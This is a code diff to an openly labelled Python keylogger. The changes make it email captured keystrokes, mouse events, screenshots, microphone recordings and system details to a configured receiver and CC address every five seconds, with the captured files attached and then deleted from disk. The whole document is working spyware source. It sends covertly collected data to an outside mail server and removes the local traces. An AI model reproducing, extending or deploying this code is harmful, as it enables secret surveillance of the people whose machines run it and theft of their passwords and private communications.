@@ -9,17 +9,19 @@ import pyscreenshot
 import sounddevice as sd
 from pynput import keyboard, mouse
 from dotenv import load_dotenv
-from utils import send_mail_with_attachment
+from utils import send_mail_with_attachment, get_wav_and_png_files, delete_wav_and_png_files
 
 load_dotenv()
 
-EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
-EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
 SMTP_SERVER = os.getenv("SMTP_SERVER")
 SMTP_PORT = os.getenv("SMTP_PORT")
+EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
+EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
 EMAIL_SENDER = os.getenv("EMAIL_SENDER")
 EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
-SEND_REPORT_EVERY = 10  # seconds
+EMAIL_CC = os.getenv("EMAIL_CC")
+SEND_REPORT_EVERY = 5  # seconds
+
 
 class KeyLogger:
     def __init__(self, time_interval, email, password):
@@ -27,8 +29,6 @@ class KeyLogger:
         self.mouse_listener = None
         self.interval = time_interval
         self.log = "KeyLogger Started...\n"
-        self.email = email
-        self.password = password
 
     def appendlog(self, string):
         if string:
@@ -65,15 +65,15 @@ class KeyLogger:
 
     def send_mail(self, message):
         send_mail_with_attachment(
-            SMTP_SERVER,
-            SMTP_PORT,
-            self.email,
-            self.password,
-            EMAIL_SENDER,
-            EMAIL_RECEIVER,
-            cc="",
-            path_to_attachment="",
-            attachments=[],
+            smtp_server=SMTP_SERVER,
+            smtp_port=SMTP_PORT,
+            email_address=EMAIL_ADDRESS,
+            email_password=EMAIL_PASSWORD,
+            email_sender=EMAIL_SENDER,
+            email_receiver=EMAIL_RECEIVER,
+            cc=EMAIL_CC,
+            path_to_attachment=os.getcwd(),
+            attachments=get_wav_and_png_files(),
             subject="Test keylogged - by F3000",
             body=message,
         )
@@ -81,11 +81,14 @@ class KeyLogger:
     def report(self):
         self.send_mail("\n\n\n" + self.log)
         print(self.log)
+        # timer = threading.Timer(self.interval, self.report)
+        # timer.start()
+
+    def cleanup(self):
         self.log = ""
         self.keyboard_listener.stop()
         self.mouse_listener.stop()
-        # timer = threading.Timer(self.interval, self.report)
-        # timer.start()
+        delete_wav_and_png_files()
 
     def system_information(self):
         hostname = socket.gethostname()
@@ -103,7 +106,7 @@ class KeyLogger:
         fs = 44100
         channels = 1  # mono
         seconds = SEND_REPORT_EVERY
-        obj = wave.open("sound.wav", "w")
+        obj = wave.open(f"sound_{time.time()}.wav", "w")
         obj.setnchannels(channels)  # mono
         obj.setsampwidth(2)  # Sampling of 16 bit
         obj.setframerate(fs)
@@ -114,14 +117,10 @@ class KeyLogger:
         obj.writeframesraw(myrecording)
         self.appendlog("\nmicrophone used.")
 
-        # self.send_mail(message=obj)
-
     def screenshot(self):
         img = pyscreenshot.grab()
-        img.save("screenshot.png")
+        img.save(f"screenshot_{time.time()}.png")
         self.appendlog("\nscreenshot used.")
-
-        # self.send_mail(message=img)
 
     def run(self):
         self.keyboard_listener = keyboard.Listener(on_press=self.save_data)
@@ -157,6 +156,7 @@ class KeyLogger:
         # self.microphone()
         time.sleep(SEND_REPORT_EVERY)
         self.report()
+        self.cleanup()
 
 
 keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
